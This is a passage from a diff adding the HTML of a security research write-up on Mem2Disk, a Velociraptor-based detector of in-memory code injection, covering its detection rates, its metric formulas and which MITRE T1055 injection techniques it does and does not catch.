+ &lt;td&gt;65% (34)&lt;/td&gt;
+ &lt;/tr&gt;
+ &lt;tr&gt;
+ &lt;td&gt;&lt;strong&gt;Total&lt;/strong&gt;&lt;/td&gt;
+ &lt;td&gt;54% (28)&lt;/td&gt;
+ &lt;td&gt;46% (24)&lt;/td&gt;
+ &lt;td&gt;100% (52)&lt;/td&gt;
+ &lt;/tr&gt;
+ &lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;Table 4: Detection rates (numbers in brackets are amount of samples)&lt;/p&gt;
+&lt;p&gt;With these results, the true negatives (TN) are 35%, while the false positives
+(FP) are 0%. Also, the false negatives (FN) are 19%, and the true positives
+(TP) are 46%.&lt;/p&gt;
+&lt;p&gt;As shown in the equations below, the detection rate is 100.0%, while the
+sensitivity is 70.6%, and the accuracy is 80.8%.&lt;/p&gt;
+&lt;p&gt;&lt;span class="katex"&gt;&lt;span class="katex-mathml"&gt;&lt;math xmlns="http://www.w3.org/1998/Math/MathML"&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;D&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;c&lt;/mi&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;mi&gt;o&lt;/mi&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mtext&gt; &lt;/mtext&gt;&lt;mi&gt;r&lt;/mi&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;mfrac&gt;&lt;mrow&gt;&lt;mi&gt;T&lt;/mi&gt;&lt;mi&gt;P&lt;/mi&gt;&lt;/mrow&gt;&lt;mrow&gt;&lt;mi&gt;T&lt;/mi&gt;&lt;mi&gt;P&lt;/mi&gt;&lt;mo&gt;+&lt;/mo&gt;&lt;mi&gt;F&lt;/mi&gt;&lt;mi&gt;P&lt;/mi&gt;&lt;/mrow&gt;&lt;/mfrac&gt;&lt;mo&gt;×&lt;/mo&gt;&lt;mn&gt;100&lt;/mn&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;mfrac&gt;&lt;mn&gt;24&lt;/mn&gt;&lt;mrow&gt;&lt;mn&gt;24&lt;/mn&gt;&lt;mo&gt;+&lt;/mo&gt;&lt;mn&gt;0&lt;/mn&gt;&lt;/mrow&gt;&lt;/mfrac&gt;&lt;mo&gt;×&lt;/mo&gt;&lt;mn&gt;100&lt;/mn&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;mn&gt;100.0&lt;/mn&gt;&lt;mi mathvariant="normal"&gt;%&lt;/mi&gt;&lt;/mrow&gt;&lt;annotation encoding="application/x-tex"&gt;Detection\ rate = \frac{TP}{TP + FP} \times 100 = \frac{24}{24 + 0} \times 100 = 100.0%&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class="katex-html" aria-hidden="true"&gt;&lt;span class="base"&gt;&lt;span class="strut" style="height:0.6833em;"&gt;&lt;/span&gt;&lt;span class="mord mathnormal"&gt;De&lt;/span&gt;&lt;span class="mord mathnormal"&gt;t&lt;/span&gt;&lt;span class="mord mathnormal"&gt;ec&lt;/span&gt;&lt;span class="mord mathnormal"&gt;t&lt;/span&gt;&lt;span class="mord mathnormal"&gt;i&lt;/span&gt;&lt;span class="mord mathnormal"&gt;o&lt;/span&gt;&lt;span class="mord mathnormal"&gt;n&lt;/span&gt;&lt;span class="mspace"&gt; &lt;/span&gt;&lt;span class="mord mathnormal" style="margin-right:0.02778em;"&gt;r&lt;/span&gt;&lt;span class="mord mathnormal"&gt;a&lt;/span&gt;&lt;span class="mord mathnormal"&gt;t&lt;/span&gt;&lt;span class="mord mathnormal"&gt;e&lt;/span&gt;&lt;span class="mspace" style="margin-right:0.2778em;"&gt;&lt;/span&gt;&lt;span class="mrel"&gt;=&lt;/span&gt;&lt;span class="mspace" style="margin-right:0.2778em;"&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="base"&gt;&lt;span class="strut" style="height:1.2757em;vertical-align:-0.4033em;"&gt;&lt;/span&gt;&lt;span class="mord"&gt;&lt;span class="mopen nulldelimiter"&gt;&lt;/span&gt;&lt;span class="mfrac"&gt;&lt;span class="vlist-t vlist-t2"&gt;&lt;span class="vlist-r"&gt;&lt;span class="vlist" style="height:0.8723em;"&gt;&lt;span style="top:-2.655em;"&gt;&lt;span class="pstrut" style="height:3em;"&gt;&lt;/span&gt;&lt;span class="sizing reset-size6 size3 mtight"&gt;&lt;span class="mord mtight"&gt;&lt;span class="mord mathnormal mtight" style="margin-right:0.13889em;"&gt;TP&lt;/span&gt;&lt;span class="mbin mtight"&gt;+&lt;/span&gt;&lt;span class="mord mathnormal mtight" style="margin-right:0.13889em;"&gt;FP&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="top:-3.23em;"&gt;&lt;span class="pstrut" style="height:3em;"&gt;&lt;/span&gt;&lt;span class="frac-line" style="border-bottom-width:0.04em;"&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="top:-3.394em;"&gt;&lt;span class="pstrut" style="height:3em;"&gt;&lt;/span&gt;&lt;span class="sizing reset-size6 size3 mtight"&gt;&lt;span class="mord mtight"&gt;&lt;span class="mord mathnormal mtight" style="margin-right:0.13889em;"&gt;TP&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="vlist-s"&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class="vlist-r"&gt;&lt;span class="vlist" style="height:0.4033em;"&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="mclose nulldelimiter"&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="mspace" style="margin-right:0.2222em;"&gt;&lt;/span&gt;&lt;span class="mbin"&gt;×&lt;/span&gt;&lt;span class="mspace" style="margin-right:0.2222em;"&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="base"&gt;&lt;span class="strut" style="height:0.6444em;"&gt;&lt;/span&gt;&lt;span class="mord"&gt;100&lt;/span&gt;&lt;span class="mspace" style="margin-right:0.2778em;"&gt;&lt;/span&gt;&lt;span class="mrel"&gt;=&lt;/span&gt;&lt;span class="mspace" style="margin-right:0.2778em;"&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="base"&gt;&lt;span class="strut" style="height:1.2484em;vertical-align:-0.4033em;"&gt;&lt;/span&gt;&lt;span class="mord"&gt;&lt;span class="mopen nulldelimiter"&gt;&lt;/span&gt;&lt;span class="mfrac"&gt;&lt;span class="vlist-t vlist-t2"&gt;&lt;span class="vlist-r"&gt;&lt;span class="vlist" style="height:0.8451em;"&gt;&lt;span style="top:-2.655em;"&gt;&lt;span class="pstrut" style="height:3em;"&gt;&lt;/span&gt;&lt;span class="sizing reset-size6 size3 mtight"&gt;&lt;span class="mord mtight"&gt;&lt;span class="mord mtight"&gt;24&lt;/span&gt;&lt;span class="mbin mtight"&gt;+&lt;/span&gt;&lt;span class="mord mtight"&gt;0&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="top:-3.23em;"&gt;&lt;span class="pstrut" style="height:3em;"&gt;&lt;/span&gt;&lt;span class="frac-line" style="border-bottom-width:0.04em;"&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="top:-3.394em;"&gt;&lt;span class="pstrut" style="height:3em;"&gt;&lt;/span&gt;&lt;span class="sizing reset-size6 size3 mtight"&gt;&lt;span class="mord mtight"&gt;&lt;span class="mord mtight"&gt;24&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="vlist-s"&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class="vlist-r"&gt;&lt;span class="vlist" style="height:0.4033em;"&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="mclose nulldelimiter"&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="mspace" style="margin-right:0.2222em;"&gt;&lt;/span&gt;&lt;span class="mbin"&gt;×&lt;/span&gt;&lt;span class="mspace" style="margin-right:0.2222em;"&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="base"&gt;&lt;span class="strut" style="height:0.6444em;"&gt;&lt;/span&gt;&lt;span class="mord"&gt;100&lt;/span&gt;&lt;span class="mspace" style="margin-right:0.2778em;"&gt;&lt;/span&gt;&lt;span class="mrel"&gt;=&lt;/span&gt;&lt;span class="mspace" style="margin-right:0.2778em;"&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="base"&gt;&lt;span class="strut" style="height:0.8056em;vertical-align:-0.0556em;"&gt;&lt;/span&gt;&lt;span class="mord"&gt;100.0%&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span class="katex"&gt;&lt;span class="katex-mathml"&gt;&lt;math xmlns="http://www.w3.org/1998/Math/MathML"&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;S&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mi&gt;s&lt;/mi&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;mi&gt;v&lt;/mi&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mi&gt;y&lt;/mi&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;mfrac&gt;&lt;mrow&gt;&lt;mi&gt;T&lt;/mi&gt;&lt;mi&gt;P&lt;/mi&gt;&lt;/mrow&gt;&lt;mrow&gt;&lt;mi&gt;T&lt;/mi&gt;&lt;mi&gt;P&lt;/mi&gt;&lt;mo&gt;+&lt;/mo&gt;&lt;mi&gt;F&lt;/mi&gt;&lt;mi&gt;N&lt;/mi&gt;&lt;/mrow&gt;&lt;/mfrac&gt;&lt;mo&gt;×&lt;/mo&gt;&lt;mn&gt;100&lt;/mn&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;mfrac&gt;&lt;mn&gt;24&lt;/mn&gt;&lt;mrow&gt;&lt;mn&gt;24&lt;/mn&gt;&lt;mo&gt;+&lt;/mo&gt;&lt;mn&gt;10&lt;/mn&gt;&lt;/mrow&gt;&lt;/mfrac&gt;&lt;mo&gt;×&lt;/mo&gt;&lt;mn&gt;100&lt;/mn&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;mn&gt;70.6&lt;/mn&gt;&lt;mi mathvariant="normal"&gt;%&lt;/mi&gt;&lt;/mrow&gt;&lt;annotation encoding="application/x-tex"&gt;Sensitivity = \frac{TP}{TP + FN} \times 100 = \frac{24}{24 + 10} \times 100 = 70.6%&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class="katex-html" aria-hidden="true"&gt;&lt;span class="base"&gt;&lt;span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"&gt;&lt;/span&gt;&lt;span class="mord mathnormal" style="margin-right:0.05764em;"&gt;S&lt;/span&gt;&lt;span class="mord mathnormal"&gt;e&lt;/span&gt;&lt;span class="mord mathnormal"&gt;n&lt;/span&gt;&lt;span class="mord mathnormal"&gt;s&lt;/span&gt;&lt;span class="mord mathnormal"&gt;i&lt;/span&gt;&lt;span class="mord mathnormal"&gt;t&lt;/span&gt;&lt;span class="mord mathnormal"&gt;i&lt;/span&gt;&lt;span class="mord mathnormal" style="margin-right:0.03588em;"&gt;v&lt;/span&gt;&lt;span class="mord mathnormal"&gt;i&lt;/span&gt;&lt;span class="mord mathnormal"&gt;t&lt;/span&gt;&lt;span class="mord mathnormal" style="margin-right:0.03588em;"&gt;y&lt;/span&gt;&lt;span class="mspace" style="margin-right:0.2778em;"&gt;&lt;/span&gt;&lt;span class="mrel"&gt;=&lt;/span&gt;&lt;span class="mspace" style="margin-right:0.2778em;"&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="base"&gt;&lt;span class="strut" style="height:1.2757em;vertical-align:-0.4033em;"&gt;&lt;/span&gt;&lt;span class="mord"&gt;&lt;span class="mopen nulldelimiter"&gt;&lt;/span&gt;&lt;span class="mfrac"&gt;&lt;span class="vlist-t vlist-t2"&gt;&lt;span class="vlist-r"&gt;&lt;span class="vlist" style="height:0.8723em;"&gt;&lt;span style="top:-2.655em;"&gt;&lt;span class="pstrut" style="height:3em;"&gt;&lt;/span&gt;&lt;span class="sizing reset-size6 size3 mtight"&gt;&lt;span class="mord mtight"&gt;&lt;span class="mord mathnormal mtight" style="margin-right:0.13889em;"&gt;TP&lt;/span&gt;&lt;span class="mbin mtight"&gt;+&lt;/span&gt;&lt;span class="mord mathnormal mtight" style="margin-right:0.10903em;"&gt;FN&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="top:-3.23em;"&gt;&lt;span class="pstrut" style="height:3em;"&gt;&lt;/span&gt;&lt;span class="frac-line" style="border-bottom-width:0.04em;"&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="top:-3.394em;"&gt;&lt;span class="pstrut" style="height:3em;"&gt;&lt;/span&gt;&lt;span class="sizing reset-size6 size3 mtight"&gt;&lt;span class="mord mtight"&gt;&lt;span class="mord mathnormal mtight" style="margin-right:0.13889em;"&gt;TP&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="vlist-s"&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class="vlist-r"&gt;&lt;span class="vlist" style="height:0.4033em;"&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="mclose nulldelimiter"&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="mspace" style="margin-right:0.2222em;"&gt;&lt;/span&gt;&lt;span class="mbin"&gt;×&lt;/span&gt;&lt;span class="mspace" style="margin-right:0.2222em;"&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="base"&gt;&lt;span class="strut" style="height:0.6444em;"&gt;&lt;/span&gt;&lt;span class="mord"&gt;100&lt;/span&gt;&lt;span class="mspace" style="margin-right:0.2778em;"&gt;&lt;/span&gt;&lt;span class="mrel"&gt;=&lt;/span&gt;&lt;span class="mspace" style="margin-right:0.2778em;"&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="base"&gt;&lt;span class="strut" style="height:1.2484em;vertical-align:-0.4033em;"&gt;&lt;/span&gt;&lt;span class="mord"&gt;&lt;span class="mopen nulldelimiter"&gt;&lt;/span&gt;&lt;span class="mfrac"&gt;&lt;span class="vlist-t vlist-t2"&gt;&lt;span class="vlist-r"&gt;&lt;span class="vlist" style="height:0.8451em;"&gt;&lt;span style="top:-2.655em;"&gt;&lt;span class="pstrut" style="height:3em;"&gt;&lt;/span&gt;&lt;span class="sizing reset-size6 size3 mtight"&gt;&lt;span class="mord mtight"&gt;&lt;span class="mord mtight"&gt;24&lt;/span&gt;&lt;span class="mbin mtight"&gt;+&lt;/span&gt;&lt;span class="mord mtight"&gt;10&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="top:-3.23em;"&gt;&lt;span class="pstrut" style="height:3em;"&gt;&lt;/span&gt;&lt;span class="frac-line" style="border-bottom-width:0.04em;"&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="top:-3.394em;"&gt;&lt;span class="pstrut" style="height:3em;"&gt;&lt;/span&gt;&lt;span class="sizing reset-size6 size3 mtight"&gt;&lt;span class="mord mtight"&gt;&lt;span class="mord mtight"&gt;24&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="vlist-s"&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class="vlist-r"&gt;&lt;span class="vlist" style="height:0.4033em;"&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="mclose nulldelimiter"&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="mspace" style="margin-right:0.2222em;"&gt;&lt;/span&gt;&lt;span class="mbin"&gt;×&lt;/span&gt;&lt;span class="mspace" style="margin-right:0.2222em;"&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="base"&gt;&lt;span class="strut" style="height:0.6444em;"&gt;&lt;/span&gt;&lt;span class="mord"&gt;100&lt;/span&gt;&lt;span class="mspace" style="margin-right:0.2778em;"&gt;&lt;/span&gt;&lt;span class="mrel"&gt;=&lt;/span&gt;&lt;span class="mspace" style="margin-right:0.2778em;"&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="base"&gt;&lt;span class="strut" style="height:0.8056em;vertical-align:-0.0556em;"&gt;&lt;/span&gt;&lt;span class="mord"&gt;70.6%&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span class="katex"&gt;&lt;span class="katex-mathml"&gt;&lt;math xmlns="http://www.w3.org/1998/Math/MathML"&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;A&lt;/mi&gt;&lt;mi&gt;c&lt;/mi&gt;&lt;mi&gt;c&lt;/mi&gt;&lt;mi&gt;u&lt;/mi&gt;&lt;mi&gt;r&lt;/mi&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mi&gt;c&lt;/mi&gt;&lt;mi&gt;y&lt;/mi&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;mfrac&gt;&lt;mrow&gt;&lt;mi&gt;T&lt;/mi&gt;&lt;mi&gt;N&lt;/mi&gt;&lt;mo&gt;+&lt;/mo&gt;&lt;mi&gt;T&lt;/mi&gt;&lt;mi&gt;P&lt;/mi&gt;&lt;/mrow&gt;&lt;mrow&gt;&lt;mi&gt;T&lt;/mi&gt;&lt;mi&gt;N&lt;/mi&gt;&lt;mo&gt;+&lt;/mo&gt;&lt;mi&gt;T&lt;/mi&gt;&lt;mi&gt;P&lt;/mi&gt;&lt;mo&gt;+&lt;/mo&gt;&lt;mi&gt;F&lt;/mi&gt;&lt;mi&gt;N&lt;/mi&gt;&lt;mo&gt;+&lt;/mo&gt;&lt;mi&gt;F&lt;/mi&gt;&lt;mi&gt;P&lt;/mi&gt;&lt;/mrow&gt;&lt;/mfrac&gt;&lt;mo&gt;×&lt;/mo&gt;&lt;mn&gt;100&lt;/mn&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;mfrac&gt;&lt;mrow&gt;&lt;mn&gt;18&lt;/mn&gt;&lt;mo&gt;+&lt;/mo&gt;&lt;mn&gt;24&lt;/mn&gt;&lt;/mrow&gt;&lt;mrow&gt;&lt;mn&gt;18&lt;/mn&gt;&lt;mo&gt;+&lt;/mo&gt;&lt;mn&gt;24&lt;/mn&gt;&lt;mo&gt;+&lt;/mo&gt;&lt;mn&gt;10&lt;/mn&gt;&lt;mo&gt;+&lt;/mo&gt;&lt;mn&gt;0&lt;/mn&gt;&lt;/mrow&gt;&lt;/mfrac&gt;&lt;mo&gt;×&lt;/mo&gt;&lt;mn&gt;100&lt;/mn&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;mn&gt;80.8&lt;/mn&gt;&lt;mi mathvariant="normal"&gt;%&lt;/mi&gt;&lt;/mrow&gt;&lt;annotation encoding="application/x-tex"&gt;Accuracy = \frac{TN + TP}{TN + TP + FN + FP} \times 100 = \frac{18 + 24}{18 + 24 + 10 + 0} \times 100 = 80.8%&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class="katex-html" aria-hidden="true"&gt;&lt;span class="base"&gt;&lt;span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"&gt;&lt;/span&gt;&lt;span class="mord mathnormal"&gt;A&lt;/span&gt;&lt;span class="mord mathnormal"&gt;cc&lt;/span&gt;&lt;span class="mord mathnormal"&gt;u&lt;/span&gt;&lt;span class="mord mathnormal" style="margin-right:0.02778em;"&gt;r&lt;/span&gt;&lt;span class="mord mathnormal"&gt;a&lt;/span&gt;&lt;span class="mord mathnormal" style="margin-right:0.03588em;"&gt;cy&lt;/span&gt;&lt;span class="mspace" style="margin-right:0.2778em;"&gt;&lt;/span&gt;&lt;span class="mrel"&gt;=&lt;/span&gt;&lt;span class="mspace" style="margin-right:0.2778em;"&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="base"&gt;&lt;span class="strut" style="height:1.2757em;vertical-align:-0.4033em;"&gt;&lt;/span&gt;&lt;span class="mord"&gt;&lt;span class="mopen nulldelimiter"&gt;&lt;/span&gt;&lt;span class="mfrac"&gt;&lt;span class="vlist-t vlist-t2"&gt;&lt;span class="vlist-r"&gt;&lt;span class="vlist" style="height:0.8723em;"&gt;&lt;span style="top:-2.655em;"&gt;&lt;span class="pstrut" style="height:3em;"&gt;&lt;/span&gt;&lt;span class="sizing reset-size6 size3 mtight"&gt;&lt;span class="mord mtight"&gt;&lt;span class="mord mathnormal mtight" style="margin-right:0.10903em;"&gt;TN&lt;/span&gt;&lt;span class="mbin mtight"&gt;+&lt;/span&gt;&lt;span class="mord mathnormal mtight" style="margin-right:0.13889em;"&gt;TP&lt;/span&gt;&lt;span class="mbin mtight"&gt;+&lt;/span&gt;&lt;span class="mord mathnormal mtight" style="margin-right:0.10903em;"&gt;FN&lt;/span&gt;&lt;span class="mbin mtight"&gt;+&lt;/span&gt;&lt;span class="mord mathnormal mtight" style="margin-right:0.13889em;"&gt;FP&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="top:-3.23em;"&gt;&lt;span class="pstrut" style="height:3em;"&gt;&lt;/span&gt;&lt;span class="frac-line" style="border-bottom-width:0.04em;"&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="top:-3.394em;"&gt;&lt;span class="pstrut" style="height:3em;"&gt;&lt;/span&gt;&lt;span class="sizing reset-size6 size3 mtight"&gt;&lt;span class="mord mtight"&gt;&lt;span class="mord mathnormal mtight" style="margin-right:0.10903em;"&gt;TN&lt;/span&gt;&lt;span class="mbin mtight"&gt;+&lt;/span&gt;&lt;span class="mord mathnormal mtight" style="margin-right:0.13889em;"&gt;TP&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="vlist-s"&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class="vlist-r"&gt;&lt;span class="vlist" style="height:0.4033em;"&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="mclose nulldelimiter"&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="mspace" style="margin-right:0.2222em;"&gt;&lt;/span&gt;&lt;span class="mbin"&gt;×&lt;/span&gt;&lt;span class="mspace" style="margin-right:0.2222em;"&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="base"&gt;&lt;span class="strut" style="height:0.6444em;"&gt;&lt;/span&gt;&lt;span class="mord"&gt;100&lt;/span&gt;&lt;span class="mspace" style="margin-right:0.2778em;"&gt;&lt;/span&gt;&lt;span class="mrel"&gt;=&lt;/span&gt;&lt;span class="mspace" style="margin-right:0.2778em;"&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="base"&gt;&lt;span class="strut" style="height:1.2484em;vertical-align:-0.4033em;"&gt;&lt;/span&gt;&lt;span class="mord"&gt;&lt;span class="mopen nulldelimiter"&gt;&lt;/span&gt;&lt;span class="mfrac"&gt;&lt;span class="vlist-t vlist-t2"&gt;&lt;span class="vlist-r"&gt;&lt;span class="vlist" style="height:0.8451em;"&gt;&lt;span style="top:-2.655em;"&gt;&lt;span class="pstrut" style="height:3em;"&gt;&lt;/span&gt;&lt;span class="sizing reset-size6 size3 mtight"&gt;&lt;span class="mord mtight"&gt;&lt;span class="mord mtight"&gt;18&lt;/span&gt;&lt;span class="mbin mtight"&gt;+&lt;/span&gt;&lt;span class="mord mtight"&gt;24&lt;/span&gt;&lt;span class="mbin mtight"&gt;+&lt;/span&gt;&lt;span class="mord mtight"&gt;10&lt;/span&gt;&lt;span class="mbin mtight"&gt;+&lt;/span&gt;&lt;span class="mord mtight"&gt;0&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="top:-3.23em;"&gt;&lt;span class="pstrut" style="height:3em;"&gt;&lt;/span&gt;&lt;span class="frac-line" style="border-bottom-width:0.04em;"&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="top:-3.394em;"&gt;&lt;span class="pstrut" style="height:3em;"&gt;&lt;/span&gt;&lt;span class="sizing reset-size6 size3 mtight"&gt;&lt;span class="mord mtight"&gt;&lt;span class="mord mtight"&gt;18&lt;/span&gt;&lt;span class="mbin mtight"&gt;+&lt;/span&gt;&lt;span class="mord mtight"&gt;24&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="vlist-s"&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class="vlist-r"&gt;&lt;span class="vlist" style="height:0.4033em;"&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="mclose nulldelimiter"&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="mspace" style="margin-right:0.2222em;"&gt;&lt;/span&gt;&lt;span class="mbin"&gt;×&lt;/span&gt;&lt;span class="mspace" style="margin-right:0.2222em;"&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="base"&gt;&lt;span class="strut" style="height:0.6444em;"&gt;&lt;/span&gt;&lt;span class="mord"&gt;100&lt;/span&gt;&lt;span class="mspace" style="margin-right:0.2778em;"&gt;&lt;/span&gt;&lt;span class="mrel"&gt;=&lt;/span&gt;&lt;span class="mspace" style="margin-right:0.2778em;"&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="base"&gt;&lt;span class="strut" style="height:0.8056em;vertical-align:-0.0556em;"&gt;&lt;/span&gt;&lt;span class="mord"&gt;80.8%&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;Lastly, detections usually ran within 1-5 minutes, sometimes in under
+a minute depending on the system hardware. It scales to the maximum
+number of systems Velociraptor can handle in parallel (i.e. &amp;gt;10.000
+machines).&lt;/p&gt;
+&lt;h1 id="6-discussion"&gt;6. Discussion&lt;/h1&gt;
+&lt;h2 id="61-evaluation"&gt;6.1. Evaluation&lt;/h2&gt;
+&lt;p&gt;We tested &lt;code&gt;Mem2Disk&lt;/code&gt; against available malware, own malware created
+using three well-known C2 frameworks, and benign software.&lt;/p&gt;
+&lt;p&gt;The results are quite promising and we were able to detect
+state-of-the-art open source C2 frameworks. When filtering out ASLR,
+&lt;code&gt;Mem2Disk&lt;/code&gt; did not detect many false positives in our tests.&lt;/p&gt;
+&lt;p&gt;Our approach shows that it is possible to scale RAM analysis up to
+multiple systems without prior knowledge which systems might be
+affected.&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;Mem2Disk&lt;/code&gt; only detects RAM injections that are visible within the
+.text segment of a process or its libraries. Adding a new memory page
+or manipulating memory locations outside of the .text segment are not
+detected.&lt;/p&gt;
+&lt;p&gt;Thus, Portable Executable (PE) injections
+(&lt;a href="https://attack.mitre.org/techniques/T1055/002/" target="_blank" &gt;T1055.002&lt;/a&gt;
+), threat
+execution hijacking
+(&lt;a href="https://attack.mitre.org/techniques/T1055/003/" target="_blank" &gt;T1055.003&lt;/a&gt;
+), threat
+local storage
+(&lt;a href="https://attack.mitre.org/techniques/T1055/005/" target="_blank" &gt;T1055.005&lt;/a&gt;
+), ptrace
+system calls
+(&lt;a href="https://attack.mitre.org/techniques/T1055/008/" target="_blank" &gt;T1055.008&lt;/a&gt;
+), process
+hollowing
+(&lt;a href="https://attack.mitre.org/techniques/T1055/012/" target="_blank" &gt;T1055.012&lt;/a&gt;
+), process
+doppelgänging
+(&lt;a href="https://attack.mitre.org/techniques/T1055/013/" target="_blank" &gt;T1055.013&lt;/a&gt;
+), and
+ListPlanting
+(&lt;a href="https://attack.mitre.org/techniques/T1055/015/" target="_blank" &gt;T1055.015&lt;/a&gt;
+) could be
+detected.&lt;/p&gt;
+&lt;p&gt;While Asynchronous Procedure Call (APC) injection
+(&lt;a href="https://attack.mitre.org/techniques/T1055/004/" target="_blank" &gt;T1055.004&lt;/a&gt;
+), proc
+memory injections
+(&lt;a href="https://attack.mitre.org/techniques/T1055/009/" target="_blank" &gt;T1055.009&lt;/a&gt;
+), extra
+windows memory injection
+(&lt;a href="https://attack.mitre.org/techniques/T1055/011/" target="_blank" &gt;T1055.011&lt;/a&gt;
+), and
+Virtual Dynamic Shared Object (VDSO) hijacking
+(&lt;a href="https://attack.mitre.org/techniques/T1055/014/" target="_blank" &gt;T1055.014&lt;/a&gt;
+) are
+currently not detected.&lt;/p&gt;
+&lt;p&gt;DLL injection
+(&lt;a href="https://attack.mitre.org/techniques/T1055/001/" target="_blank" &gt;T1055.001&lt;/a&gt;
+) might be
+detected if program code or DLL code is changed (e.g. DLL hollowing)
+but is not detected if a DLL is loaded additionally (e.g. via Import
+Address Table (IAT)). IAT could be detected though, if the new code is
+added in memory to an existing library.&lt;/p&gt;
+&lt;p&gt;If malware removes itself from RAM temporarily or hooks the functions
